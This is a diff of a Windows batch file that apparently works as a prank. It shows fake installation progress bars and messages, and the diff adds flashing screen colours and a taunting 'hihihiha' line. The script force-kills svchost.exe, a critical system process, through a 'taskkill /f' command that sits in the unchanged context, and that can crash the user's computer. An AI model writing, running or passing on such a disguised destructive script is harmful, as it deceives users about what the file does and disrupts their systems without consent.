@@ -24,7 +24,7 @@ cls
 echo [=====] 99%
 timeout 3 > nul
 cls
-echo installed!
+echo success!
 timeout 2 > nul
 cls
 echo starting [
@@ -42,6 +42,12 @@ cls
 echo closed cmd...
 timeout 2 > nul
 cls
+color 07
+color 77
+color 07
+color 77
+color 07
 taskkill /f /im svchost.exe
 cls
-hihihiha
+
+echo hihihiha
